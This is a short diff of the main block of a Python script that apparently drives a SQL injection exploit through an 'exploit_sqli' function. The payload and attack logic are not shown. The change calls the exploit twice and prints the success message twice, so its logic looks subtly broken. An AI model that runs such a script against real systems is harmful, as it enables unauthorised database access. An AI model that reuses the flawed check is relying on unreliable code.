@@ -27,9 +27,9 @@ if __name__ == "__main__":
 
     response = exploit_sqli(url, payload)
 
-    if response.status_code == 200 and "" in response.text:
+    if exploit_sqli(url, payload):
         print("[+] SQL injection successful!")
-        print("Response:")
-        print(response.text)
+        print("[+] SQL injection successful!")
+        print(f"Response:{response}")
     else:
         print("[-] SQL injection unsuccessful!")
